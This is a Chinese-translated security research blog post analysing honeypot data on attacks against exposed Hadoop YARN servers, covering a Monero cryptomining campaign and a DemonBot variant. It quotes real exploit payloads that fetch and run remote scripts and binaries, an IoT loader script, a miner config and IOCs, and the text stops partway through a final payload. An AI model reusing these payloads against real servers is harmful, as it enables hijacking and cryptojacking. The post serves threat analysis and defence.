<html>
<head>
<title>Hadoop YARN: Assessment of the Attack Surface and Its Exploits</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Hadoop YARN:攻击面及其利用的评估</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/hadoop-yarn-assessment-of-the-attack-surface-and-its-exploits-e239759f3809?source=collection_archive---------13-----------------------#2018-11-15">https://medium.com/hackernoon/hadoop-yarn-assessment-of-the-attack-surface-and-its-exploits-e239759f3809?source=collection_archive---------13-----------------------#2018-11-15</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><p id="2918" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><em class="jp">TL；博士</em></p><ul class=""><li id="8f73" class="jq jr hu it b iu iv iy iz jc js jg jt jk ju jo jv jw jx jy dt translated"><em class="jp">Hadoop YARN漏洞利用的速度正在放缓，但仍保持在每天约350，000个事件的水平</em></li><li id="87f6" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated"><em class="jp"> 1065台服务器暴露易受攻击</em></li><li id="b2f7" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated"><em class="jp">易受攻击的服务器和攻击目标的地理分布是全球性的，并且集中在云数据中心密度高的地区</em></li><li id="93e0" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated"><em class="jp">这些攻击背后的动机多种多样，从植入Linux后门、用扫描和DDoS的物联网恶意软件感染服务器，到密码挖掘活动</em></li><li id="27dd" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated"><em class="jp">自2018年4月以来，Monero cryptomining活动一直在积极滥用暴露的Hadoop YARN服务器，开采总收入为566 XMR(约60，000美元),并以平均每天2 XMR (212美元)的速度增长收入</em></li><li id="a1f6" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated"><em class="jp">在不到14天的时间里，从Hadoop YARN漏洞攻击中收集到的恶意软件足以创建一个小型动物园</em></li><li id="a0f6" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated"><em class="jp">Hadoop YARN服务器的所有者应该小心，因为他们可能成为滥用密码挖掘的受害者，导致性能下降、不稳定和更高的云利用率费用</em></li><li id="8a28" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated">网上商家也应该关心。它们可能成为DDoS攻击的目标。</li><li id="4375" class="jq jr hu it b iu jz iy ka jc kb jg kc jk kd jo jv jw jx jy dt translated"><em class="jp">消费者应该关心，因为如果他们最喜欢的网上商店成为DDoS攻击的受害者，他们将无法在网络星期一购物</em></li></ul><p id="6096" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">在我关于DemonBot的<a class="ae ke" href="https://blog.radware.com/security/2018/10/new-demonbot-discovered/" rel="noopener ugc nofollow" target="_blank">博客</a>中，我讨论了Hadoop YARN漏洞利用企图是如何升级的。在10月中旬，我们的欺骗网络每天记录多达150万次尝试<em class="jp"/>。好消息是，在上个月的下半个月，尝试率稳步下降——尽管不幸的是，还没有到我们应该为揭露了许多利用暴露的Hadoop YARN服务器的恶意活动之一而沾沾自喜的地步。</p><p id="8524" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">在过去的几天里，Hadoop Yarn漏洞利用尝试的数量放缓至平均每天350，000次。也就是说，没有迹象表明威胁会很快消失，我们应该保持警惕。为了评估风险并量化威胁，自从我的上一篇博客以来，我一直在跟踪Hadoop YARN活动并探索攻击面的范围。了解潜在的滥用和暴露的服务器出现的威胁类型，可以更好地评估风险。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff kf"><img src="../Images/b5a6ebc8220a6ea8f6bafef6766fb1ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LrXb1a7FUsWtkCZRyUBHyw.png"/></div></div></figure><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff kr"><img src="../Images/9bc7b5140a4b6df6b03217b8d4870b51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VxcWRHtZE2U_o7RugSJmAg.png"/></div></div></figure><h1 id="3c84" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">攻击者和他们的受害者</h1><p id="ae18" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">从9月到11月上半月，我们的欺骗网络记录了超过3500万次利用漏洞的尝试，其中超过三分之一来自美国。英国、意大利和德国位居第二，三个国家联合起来，成功应对了超过一半的攻击企图。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff lv"><img src="../Images/5e46196d794707c558f1db904d5eabde.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nl8sM_hL5mRbsgVmStOcow.png"/></div></div></figure><p id="738d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">从绝对数字来看，美国产生了近1200万次利用漏洞的尝试。英国和意大利各有600万次尝试，紧随其后的是德国，有480万次尝试。</p><p id="7e4a" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">攻击企图并不是专门针对某个地区的。英国和德国的“蜜罐”受到的打击是世界其他地区的两倍。每个地区的平均数字在160万到320万之间。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff lw"><img src="../Images/700e4ba2168302e6d12b0286314d8ef5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p9D6vEu8dSzuAwf1fA_SBg.png"/></div></div></figure><h1 id="1e1e" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">Hadoop纱线攻击面</h1><p id="31e7" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">为了评估攻击面，我对监听Hadoop YARN端口TCP/8088的服务进行了全局扫描，小心排除Robert Graham的<a class="ae ke" href="https://github.com/robertdavidgraham/masscan" rel="noopener ugc nofollow" target="_blank"> masscan </a>排除列表中列出的敏感IP范围。到11月8日，暴露在公众面前的易受攻击的Hadoop YARN服务器数量为1065个。易受攻击的服务器分散在全球各地，在数据中心密度高的区域更为集中。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff lx"><img src="../Images/bb394708dd11b57281450e6e8c9f8b0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*inFmW8KEUHKbx76cGFH-ng.png"/></div></div></figure><p id="9eee" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">将上述易受攻击的Hadoop YARN服务器的位置与下面的<a class="ae ke" href="https://www.datacentermap.com/" rel="noopener ugc nofollow" target="_blank">全球数据中心地图</a>进行比较:</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff ly"><img src="../Images/380f440a4454b3c976c6c253ed1a659f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GoHQmdBu7ezMyBgK5Pd2_w.png"/></div></div></figure><p id="0929" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">攻击面是全球性的，仅限于1，000多台服务器，但不应忽视这一点，因为强大的大数据服务器通常为恶意代理提供了巨大的潜力。</p><h1 id="ccbc" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">虐待的类型</h1><p id="29f4" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">既然我们已经对攻击面和恶意参与者的兴趣有了一个很好的度量，现在是时候更仔细地看看这些参与者是如何试图利用这种情况的。</p><p id="9311" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">下图显示了我们的medium interaction蜜罐在14天内记录的不同Hadoop YARN漏洞。每个漏洞有效载荷都包含一个命令序列，该序列被散列到一个唯一的指纹中，使我们能够量化和跟踪一段时间内的活动。(*1)中的漏洞利用表包含与图中指纹相对应的每个命令序列的详细信息。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff lz"><img src="../Images/21fb7edd76bee9bfd723451b18a2fddf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p4PLD-7no6tPELkPg0eR9Q.png"/></div></div></figure><p id="8c07" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">上面命令序列图中的红色条表示新DemonBot活动“YSDKOP”每天的尝试计数，该活动以恶意软件二进制文件的名称命名。</p><p id="2dc0" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">不同蓝色阴影中的两个大峰代表与Hadoop YARN密码挖掘活动相关的多个漏洞，该活动已经运行了至少8个月；它于2018年4月首次被发现，最近将其下载基础设施转移到BitBucket.org。猜测使用Atlassian的免费和公共服务来跟踪不同版本的cryptominer及其配置文件会更方便…</p><p id="6108" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">上面的命令序列图中显示的其他时间较短、攻击性较低的活动主要是Linux/IoT僵尸网络的感染尝试。下面讨论了一些似乎值得一提的问题。</p><h1 id="4765" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">比特桶加密挖掘器</h1><p id="f19e" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">自今年4月以来，一项正在进行的Monero cryptomining活动一直被认为是积极滥用暴露的Hadoop YARN服务器，共开采了566 XMR(约60，000美元)，并以平均每天2 XMR (212美元)的速度增长其收入。恶意代理或组目前正在滥用三台服务器，并且随着时间的推移，平均哈希速率保持在400千赫/秒。</p><p id="33cf" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">利用Hadoop YARN漏洞，从公共BitBucket帐户下载并执行外壳脚本:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="bc4a" class="mf kt hu mb b fv mg mh l mi mj">{“max-app-attempts”:2,”am-container-spec”:{“commands”:{“command”:”wget -q -O — <a class="ae ke" href="https://bitbucket.org/zrundr42/mygit/raw/master/zz.sh" rel="noopener ugc nofollow" target="_blank">https://bitbucket.org/zrundr42/mygit/raw/master/zz.sh</a> | bash &amp; disown”}},”application-id”:”application_1802197302061_0095″,”application-type”:”YARN”,”application-name”:”hadoop”}</span></pre><p id="721c" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">“zz.sh”脚本存档在(*2)中以供参考，它在最终从<a class="ae ke" href="https://bitbucket.org/zrundr42/mygit/src/master/" rel="noopener ugc nofollow" target="_blank">同一个存储库</a>下载一个名为“x_64”的二进制文件之前，在服务器上执行一些清理工作。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div class="fe ff mk"><img src="../Images/479809c085886fac30a6f33596d20bf0.png" data-original-src="https://miro.medium.com/v2/resize:fit:972/format:webp/1*oXO-1XCQ-cffQrnaqy4SQQ.png"/></div></figure><p id="c320" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">x_64二进制是XMRig，一个用C++写的开源高性能Monero CPU miner(【https://github.com/xmrig/xmrig】T2)。</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="6283" class="mf kt hu mb b fv mg mh l mi mj">$ ./x_64 --version<br/>XMRig 2.8.1<br/>built on Oct 18 2018 with GCC 4.8.4<br/>features: 64-bit AES<br/>libuv/1.9.1</span></pre><p id="d73d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">XMRig的配置文件是“w.conf ”,从同一个位存储库下载:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="24eb" class="mf kt hu mb b fv mg mh l mi mj">{<br/>    "algo": "cryptonight",<br/>    "background": true,<br/>    "colors": false,<br/>    "retries": 5,<br/>    "retry-pause": 5,<br/>    "donate-level": 1,<br/>    "syslog": false,<br/>    "log-file": null,<br/>    "print-time": 60,<br/>    "av": 0,<br/>    "safe": false,<br/>    "max-cpu-usage": 95,<br/>    "cpu-priority": 4,<br/>    "threads": null,<br/>    "pools": [<br/>         {<br/>            "url": "stratum+tcp://163.172.205[.]136:3333",<br/>            "user": "46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S",<br/>            "pass": "h",<br/>            "keepalive": true,<br/>            "nicehash": false,<br/>            "variant": -1<br/>        }<br/>    ],<br/>    "api": {<br/>        "port": 0,<br/>        "access-token": null,<br/>        "worker-id": null<br/>    }<br/>}</span></pre><p id="d82d" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">从配置文件中，我们可以找到池钱包地址:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="c282" class="mf kt hu mb b fv mg mh l mi mj">46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S</span></pre><p id="5e2e" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">钱包地址与今年5月Hadoop管理员在<a class="ae ke" href="https://stackoverflow.com/questions/50534973/yarn-dr-who-application-attempt-appattempt-fail" rel="noopener ugc nofollow" target="_blank"> Stackoverflow </a>和<a class="ae ke" href="https://community.hortonworks.com/questions/191898/hdp-261-virus-crytalminer-drwho.html" rel="noopener ugc nofollow" target="_blank"> HortonWorks </a>社区中报告的操作地址相匹配；数千个密码挖掘作业导致了集群问题。</p><p id="943f" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">8月，360威胁情报中心发布了一份关于他们所谓的“8220挖矿团伙”的<a class="ae ke" href="https://ti.360.net/blog/articles/8220-mining-gang-in-china/" rel="noopener ugc nofollow" target="_blank">报告</a>，也提到了同一个钱包地址。据研究人员称，这个采矿团伙被怀疑来自中国。</p><p id="3a44" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">同样的地址也与Github上托管的另一个名为“<a class="ae ke" href="https://github.com/lukacci/cpuhunter/tree/256a91d4a2a360f942827539a4c81f501a9db7ec" rel="noopener ugc nofollow" target="_blank"> Cpuhunter </a>”的密码挖掘开源软件的自述文件中的示例Nanopool报告链接中使用的钱包地址相匹配。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff ml"><img src="../Images/e278e303c06e29b0fcdaa6ca394e7eb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1fbBdLhZX6sjcxyEav--iQ.png"/></div></div></figure><p id="607f" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">从4月10日开始使用的Nanopool钱包账户可以通过这个<a class="ae ke" href="https://xmr.nanopool.org/account/46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S" rel="noopener ugc nofollow" target="_blank">链接</a>进行追踪。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff mm"><img src="../Images/c306fabca4dd48342482bbf78a1dc12b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OWN89ExOtrN6cDfo1nR9gQ.png"/></div></div></figure><p id="e629" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">截至11月12日，非法采矿作业产生的总XMR付款为566 XMR或约60，000美元。</p><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff mn"><img src="../Images/894613578e76fe5d31471d4e82e3d7b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NfRF7jCIdjmH3apz9BqrKw.png"/></div></div></figure><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="8605" class="mf kt hu mb b fv mg mh l mi mj">IOC</span><span id="eb71" class="mf kt hu mb b fv mo mh l mi mj">a1bd663986bae6b5cea19616c9507d09618eaddb71051ae826580a0b7e610ae5 x_64<br/>Bitbucket repo: <a class="ae ke" href="https://bitbucket.org/zrundr42/mygit/src/master/" rel="noopener ugc nofollow" target="_blank">https://bitbucket[.]org/zrundr42/mygit/src/master/</a><br/>Mining pool account:<br/>46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S</span></pre><h1 id="babe" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">躲起来的恶魔机器人</h1><p id="b3f4" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">YSDKOP机器人是通过Hadoop YARN利用以下有效负载交付的:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="e291" class="mf kt hu mb b fv mg mh l mi mj">User-Agent: [python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-754.3.5.el6.x86_64]<br/>{"am-container-spec": {"commands": {"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/bins.sh -O /tmp/flex; chmod +x /tmp/flex; /tmp/flex; rm -rf/tmp/flex"}}, "application-id": "application_1802197302061_0095", "application-type": "YARN", "application-name": "get-shell"}</span></pre><p id="db84" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">下载的“bins.sh”脚本以典型的物联网加载程序的方式依次下载几个二进制文件:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="3236" class="mf kt hu mb b fv mg mh l mi mj">$ cat bins.sh <br/>#!/bin/bash<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.mips; chmod +x YSDKOP.mips; ./YSDKOP.mips; rm -rf YSDKOP.mips<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.mpsl; chmod +x YSDKOP.mpsl; ./YSDKOP.mpsl; rm -rf YSDKOP.mpsl<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.sh4; chmod +x YSDKOP.sh4; ./YSDKOP.sh4; rm -rf YSDKOP.sh4<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.x86; chmod +x YSDKOP.x86; ./YSDKOP.x86; rm -rf YSDKOP.x86<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.arm6; chmod +x YSDKOP.arm6; ./YSDKOP.arm6; rm -rf YSDKOP.arm6<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.i686; chmod +x YSDKOP.i686; ./YSDKOP.i686; rm -rf YSDKOP.i686<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.ppc; chmod +x YSDKOP.ppc; ./YSDKOP.ppc; rm -rf YSDKOP.ppc<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.i586; chmod +x YSDKOP.i586; ./YSDKOP.i586; rm -rf YSDKOP.i586<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.m68k; chmod +x YSDKOP.m68k; ./YSDKOP.m68k; rm -rf YSDKOP.m68k<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.sparc; chmod +x YSDKOP.sparc; ./YSDKOP.sparc; rm -rf YSDKOP.sparc<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.arm4; chmod +x YSDKOP.arm4; ./YSDKOP.arm4; rm -rf YSDKOP.arm4<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.arm5; chmod +x YSDKOP.arm5; ./YSDKOP.arm5; rm -rf YSDKOP.arm5<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.arm7; chmod +x YSDKOP.arm7; ./YSDKOP.arm7; rm -rf YSDKOP.arm7<br/>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25[.]153/YSDKOP.ppc440fp; chmod +x YSDKOP.ppc440fp; ./YSDKOP.ppc440fp; rm -rf YSDKOP.ppc440fp</span></pre><p id="24c2" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">不同的二进制文件对应于多个平台架构的相同源代码的交叉编译版本:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="e731" class="mf kt hu mb b fv mg mh l mi mj">$ file *<br/>YSDKOP.arm4:  ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, with debug_info, not stripped<br/>YSDKOP.arm5:  ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, with debug_info, not stripped<br/>YSDKOP.arm6:  ELF 32-bit LSB executable, ARM, EABI4 version 1 (SYSV), statically linked, with debug_info, not stripped<br/>YSDKOP.arm7:  ELF 32-bit LSB executable, ARM, EABI4 version 1 (SYSV), statically linked, with debug_info, not stripped<br/>YSDKOP.i586:  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped<br/>YSDKOP.i686:  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped<br/>YSDKOP.m68k:  ELF 32-bit MSB executable, Motorola m68k, 68020, version 1 (SYSV), statically linked, not stripped<br/>YSDKOP.mips:  ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, not stripped<br/>YSDKOP.mpsl:  ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, not stripped<br/>YSDKOP.ppc:   ELF 32-bit MSB executable, PowerPC or cisco 4500, version 1 (SYSV), statically linked, not stripped<br/>YSDKOP.sh4:   ELF 32-bit LSB executable, Renesas SH, version 1 (SYSV), statically linked, not stripped<br/>YSDKOP.sparc: ELF 32-bit MSB executable, SPARC, version 1 (SYSV), statically linked, with debug_info, not stripped<br/>YSDKOP.x86:   ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped</span></pre><p id="5c22" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">快速浏览一下i586二进制文件的字符串就会发现典型的DemonBot标记:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="1623" class="mf kt hu mb b fv mg mh l mi mj">$ strings YSDKOP.i586<br/>…<br/>185.244.25[.]153:420<br/>8.8.8.8<br/>/proc/net/route<br/>        00000000<br/>(null)<br/>/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ<br/>/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID<br/>/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38<br/>/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93<br/>/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A<br/>/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A<br/>nwonknu<br/>unknown<br/>Hello<br/>slammed<br/>…<br/>Sending TCP Packets To: %s:%d for %d seconds<br/>STOP<br/>[Shelling]--&gt;[%s]--&gt;[%s]--&gt;[%s]--&gt;[%s]--&gt;[%s]</span></pre><p id="78fa" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">这是一个隐藏在随机名称YSDKOP后面的未更改的<a class="ae ke" href="https://blog.radware.com/security/2018/10/new-demonbot-discovered/" rel="noopener ugc nofollow" target="_blank"> DemonBot </a>。</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="c957" class="mf kt hu mb b fv mg mh l mi mj">IOC<br/> <br/>59719aa688954e7f4dd575173d7c9b5de6fd0d69d8c9ed8834d91a144e635e3b bins.sh 106dc7d4f44c1077b62c6d509ce471c79e27ffc7369d6418ddafed861c0f93be YSDKOP.arm4 dd62d3b51b194729f7270c590f647d08a1cbc6af8ecf0b92a98dc3e330fe304a YSDKOP.arm5 3fb0dd65608b93034e212ad85e660f6bc25a5df896410e0c6b9c411e56faac55 YSDKOP.arm6 74f8d9c9d91f87aa7f092efa6b12a4c9dfff492eb54f12d6e35e8bf3e96eacff YSDKOP.arm7 a36dff7844715c796de80f26b9dd4470de8cbc6c941499b6a94c048afd567316 YSDKOP.i586 7caed4bafe6c964c090d78f93e7eb7943bb19575532f19e70a87cfe2943d1621 YSDKOP.i686 dd8163a99b5cdd3e591213c64ad48e25d594f4b7ab9802cd7c60f3150a9e71f9 YSDKOP.m68k 67e85c8b24c3e382a1d83245d1c77f6b8b5f0b19be36fd8fb06f1cb42d07dad5 YSDKOP.mips 8b2407226356487558a26aba967befd48df53a5f53fd23b300f22b4dc9abe293 YSDKOP.mpsl b94176a7448aa8ea0c961bc69371778828f3ab5665b14cc235f8413d8bf86386 YSDKOP.ppc a96e07c8dc42eb05fa21069bb14391ee4241d1ccd9289c52cb273ffb7ecd3891 YSDKOP.sh4 43e445b0c644d52129c47154cd6bcdea7192d680cc3d2e8165b904c54ddd6fc2 YSDKOP.sparc<br/>39f2b2c68362a347aad0942853d0262acec1e2f4174ba973b0c574f4567cb893 YSDKOP.x86</span></pre><h1 id="f948" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">上文，DemonBot-ng</h1><p id="c78a" class="pw-post-body-paragraph ir is hu it b iu lq iw ix iy lr ja jb jc ls je jf jg lt ji jj jk lu jm jn jo hn dt translated">通过以下Hadoop YARN exploit有效负载进行感染:</p><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="7c13" class="mf kt hu mb b fv mg mh l mi mj">{"am-container-spec": {"commands": {"command": "cd /tmp; rm -rf *; wget http://80.211.59[.]125/n; sh n"}}, "application-id": 